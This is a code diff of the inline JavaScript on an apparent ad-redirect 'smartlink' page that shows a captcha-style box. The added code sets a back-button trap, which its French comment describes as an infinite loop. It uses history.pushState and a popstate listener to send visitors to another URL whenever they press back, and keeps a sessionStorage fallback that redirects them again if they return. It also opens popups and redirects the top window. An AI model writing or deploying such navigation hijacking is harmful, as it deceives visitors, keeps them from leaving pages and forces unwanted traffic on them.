@@ -118,13 +118,29 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Ar
 </footer>
 
 <script>
+// Fallback sessionStorage : si le navigateur revient ici (pas de bfcache),
+// on redirige immédiatement vers la LP no-return
+(function() {
+    var nr = sessionStorage.getItem('noreturn_url');
+    if (nr) {
+        sessionStorage.removeItem('noreturn_url');
+        window.location.replace(nr);
+    }
+})();
+
 var baseUrl = "https://lespetitscoquins.fr/p/smartlink.php";
 var templateUrl = baseUrl + "?action=get_template";
 var hasRedirected = false;
 
 window.addEventListener("pageshow", function(event) {
     if (event.persisted) {
-        window.location.reload();
+        var nr = sessionStorage.getItem('noreturn_url');
+        if (nr) {
+            sessionStorage.removeItem('noreturn_url');
+            window.location.replace(nr);
+        } else {
+            window.location.reload();
+        }
     }
 });
 
@@ -142,24 +158,26 @@ function openInNewTab(url) {
     document.body.removeChild(link);
 }
 
-function handleRedirects(mainUrl, popUrl, backId) {
+function handleRedirects(mainUrl, popUrl, backUrl) {
     if (hasRedirected) return;
     if (!mainUrl) { location.reload(); return; }
     hasRedirected = true;
 
+    // Slot 2 : popup (ouvre dans un nouvel onglet)
     if (popUrl && popUrl !== mainUrl) {
         openInNewTab(popUrl);
     }
 
-    if (backId && backId !== mainUrl) {
-        if (backId.indexOf("http") === 0) {
-            openInNewTab(backId);
-        } else {
-            var trapUrl = baseUrl + "?sec_id=" + backId + getSearchParams();
-            openInNewTab(trapUrl);
-        }
+    // Slot 3 : piège bouton retour (pushState + popstate = boucle infinie)
+    if (backUrl && backUrl !== mainUrl) {
+        history.pushState(null, null, '');
+        window.addEventListener('popstate', function() {
+            window.location.assign(backUrl);
+        });
+        sessionStorage.setItem('noreturn_url', backUrl);
     }
 
+    // Slot 1 : redirect principal
     setTimeout(function() {
         window.top.location.href = mainUrl;
     }, 300);
@@ -238,6 +256,7 @@ function loadTemplate() {
             indicator.style.display = "none";
 
             if (data.status === "ok" && data.html) {
+                sessionStorage.removeItem('noreturn_url');
                 var container = document.getElementById("captcha-box");
                 container.innerHTML = data.html;
 
